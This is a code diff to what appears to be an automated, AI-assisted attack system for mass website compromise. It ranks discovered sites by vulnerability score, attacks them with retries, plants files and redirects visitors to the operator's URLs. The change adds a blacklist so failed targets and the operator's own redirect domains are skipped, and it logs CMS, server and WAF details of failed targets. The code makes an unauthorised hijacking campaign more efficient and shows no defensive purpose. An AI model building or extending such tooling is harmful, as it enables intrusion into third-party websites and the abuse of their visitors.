@@ -33,6 +33,7 @@ import {
   type AttackOutcome,
 } from "./ai-attack-strategist";
 import { runLearningCycle } from "./adaptive-learning";
+import { isBlacklisted, isOwnRedirectUrl, recordFailedAttack, recordSuccessfulAttack, filterTargets } from "./attack-blacklist";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -410,11 +411,26 @@ async function runAgenticLoop(
       discoveryResult = { targets: [], errors: [e.message], totalQueriesRun: 0, totalRawResults: 0, totalAfterDedup: 0, totalAfterFilter: 0, totalScored: 0, id: "", startedAt: Date.now(), status: "error" as const };
     }
     
-    const targets = discoveryResult.targets
-      .sort((a, b) => b.vulnScore - a.vulnScore) // Highest vuln score first
+    const rawTargets = discoveryResult.targets
+      .sort((a, b) => b.vulnScore - a.vulnScore)
       .slice(0, maxTargets);
     
-    await emitEvent("discovery", `✅ ค้นพบ ${targets.length} เป้าหมาย (จาก ${discoveryResult.totalRawResults} ผลลัพธ์ดิบ)`, 25, {
+    // ═══ BLACKLIST + SELF-ATTACK FILTER ═══
+    const { allowed: filteredTargets, blocked: blockedTargets } = await filterTargets(
+      rawTargets,
+      redirectUrls,
+    );
+    
+    if (blockedTargets.length > 0) {
+      await emitEvent("discovery", `🚫 กรองออก ${blockedTargets.length} เป้าหมาย (blacklisted/self-redirect): ${blockedTargets.slice(0, 3).map(b => `${b.target.domain}: ${b.reason}`).join(", ")}`, 20, {
+        blockedCount: blockedTargets.length,
+        blocked: blockedTargets.slice(0, 10).map(b => ({ domain: b.target.domain, reason: b.reason })),
+      });
+    }
+    
+    const targets = filteredTargets as DiscoveredTarget[];
+    
+    await emitEvent("discovery", `✅ ค้นพบ ${targets.length} เป้าหมาย (จาก ${discoveryResult.totalRawResults} ดิบ, กรองออก ${blockedTargets.length})`, 25, {
       totalFound: targets.length,
       totalRaw: discoveryResult.totalRawResults,
       topTargets: targets.slice(0, 5).map(t => ({ domain: t.domain, cms: t.cms, score: t.vulnScore })),
@@ -720,6 +736,9 @@ async function attackSingleTarget(
             }
           } catch { /* best-effort */ }
 
+          // ═══ BLACKLIST: Clear on success ═══
+          recordSuccessfulAttack(target.domain).catch(() => {});
+
           await emitEvent("success", `✅ ${target.domain} — สำเร็จ! ${verifiedUrls.length} files placed, redirect → ${redirectUrl}${attempt > 0 ? ` (retry #${attempt})` : ""}`, 0, {
             domain: target.domain,
             deployId,
@@ -832,7 +851,18 @@ async function attackSingleTarget(
       }).catch((e) => console.error(`[AdaptiveLearning] record failure error: ${e.message}`));
 
       if (attempt >= maxRetries) {
-        await emitEvent("failed", `❌ ${target.domain} — ล้มเหลวหลัง ${attempt + 1} ครั้ง (AI retries exhausted)`, 0, {
+        // ═══ BLACKLIST: Record failed attack ═══
+        recordFailedAttack({
+          domain: target.domain,
+          reason: `Failed after ${attempt + 1} attempts: ${jobFinalStatus}`,
+          errors: attemptHistory.map(a => a.errorMessage || "unknown"),
+          durationMs: Date.now() - attackStartTime,
+          cms: target.cms || null,
+          serverType: target.serverType || null,
+          waf: target.waf || null,
+        }).catch(() => {});
+
+        await emitEvent("failed", `❌ ${target.domain} — ล้มเหลวหลัง ${attempt + 1} ครั้ง (AI retries exhausted) → เพิ่มใน blacklist`, 0, {
           domain: target.domain,
           deployId,
           totalAttempts: attempt + 1,
@@ -896,7 +926,18 @@ async function attackSingleTarget(
       }).catch((err) => console.error(`[AdaptiveLearning] record error error: ${err.message}`));
 
       if (attempt >= maxRetries) {
-        await emitEvent("failed", `❌ ${target.domain} — Error หลัง ${attempt + 1} ครั้ง: ${e.message}`, 0);
+        // ═══ BLACKLIST: Record error ═══
+        recordFailedAttack({
+          domain: target.domain,
+          reason: `Error after ${attempt + 1} attempts: ${e.message}`,
+          errors: attemptHistory.map(a => a.errorMessage || "unknown"),
+          durationMs: Date.now() - attackStartTime,
+          cms: target.cms || null,
+          serverType: target.serverType || null,
+          waf: target.waf || null,
+        }).catch(() => {});
+
+        await emitEvent("failed", `❌ ${target.domain} — Error หลัง ${attempt + 1} ครั้ง: ${e.message} → เพิ่มใน blacklist`, 0);
         return { target, success: false, reason: e.message };
       }
 
